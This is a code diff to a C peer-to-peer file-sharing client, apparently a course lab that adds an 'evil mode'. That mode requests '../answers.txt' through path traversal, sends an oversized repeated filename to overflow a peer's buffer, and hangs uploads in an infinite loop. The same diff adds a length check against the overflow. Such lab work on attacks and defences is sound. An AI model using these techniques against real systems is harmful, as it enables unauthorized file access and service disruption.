@@ -38,6 +38,8 @@ static int listen_port;
 #define TASKBUFSIZ	4096	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
 
+#define OVERFLOW_NAME	"PIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHU"
+
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
 	TASK_PEER_LISTEN,	// => Listens for upload requests
@@ -172,7 +174,9 @@ taskbufresult_t read_to_taskbuf(int fd, task_t *t)
 			  || errno == EWOULDBLOCK))
 		return TBUF_AGAIN;
 	else if (amt == -1)
+	{
 		return TBUF_ERROR;
+	}
 	else if (amt == 0)
 		return TBUF_END;
 	else {
@@ -464,6 +468,31 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 
 	message("* Finding peers for '%s'\n", filename);
 
+	if (evil_mode && (strcmp(filename, "../answers.txt") == 0))
+	{
+		osp2p_writef(tracker_task->peer_fd, "WANT %s\n", "cat1.jpg");
+		messagepos = read_tracker_response(tracker_task);
+		if (tracker_task->buf[messagepos] != '2') {
+			error("* Tracker error message while requesting '%s':\n%s", filename, &tracker_task->buf[messagepos]);
+		goto exit;
+		}
+		if (!(t = task_new(TASK_DOWNLOAD))) {
+			error("* Error while allocating task");
+			goto exit;
+		}
+		strcpy(t->filename, filename);
+		s1 = tracker_task->buf;
+		while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1)))
+		{
+			if (!(p = parse_peer(s1, s2 - s1)))
+				die("osptracker responded to WANT command with unexpected format!\n");
+			p->next = t->peer_list;
+			t->peer_list = p;
+			s1 = s2 + 1;
+		}
+		return t;
+	}	
+
 	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
 	messagepos = read_tracker_response(tracker_task);
 	if (tracker_task->buf[messagepos] != '2') {
@@ -525,6 +554,13 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+
+	if (evil_mode)
+	{
+		message("Attempting download attack...\n");
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", OVERFLOW_NAME);
+	}
+
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -631,6 +667,13 @@ static task_t *task_listen(task_t *listen_task)
 static void task_upload(task_t *t)
 {
 	assert(t->type == TASK_UPLOAD);
+	if (evil_mode)
+	{
+		message("Infinite upload loop\n");
+		while (1)
+		{}
+	}
+			
 	// First, read the request from the peer.
 	while (1) {
 		int ret = read_to_taskbuf(t->peer_fd, t);
@@ -643,6 +686,11 @@ static void task_upload(task_t *t)
 	}
 
 	assert(t->head == 0);
+	if (t->tail > FILENAMESIZ)
+	{
+		message("File name would have led to overflow\n");
+		goto exit;
+	}
 	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
 		error("* Odd request %.*s\n", t->tail, t->buf);
 		goto exit;
@@ -758,10 +806,23 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
 
+	if (evil_mode)
+	{
+		message("Initializing evil...\n");
+		//if ((t = start_download(tracker_task, "../answers.txt")))
+		//	task_download(t, tracker_task);
+		//if ((t = start_download(tracker_task, OVERFLOW_NAME)))
+		//	task_download(t, tracker_task);
+	}
+
 	// First, download files named on command line.
 	for (; argc > 1; argc--, argv++)
+	{
 		if ((t = start_download(tracker_task, argv[1])))
+		{
 			task_download(t, tracker_task);
+		}
+	}
 
 	// Then accept connections from other peers and upload files to them!
 	while ((t = task_listen(listen_task)))
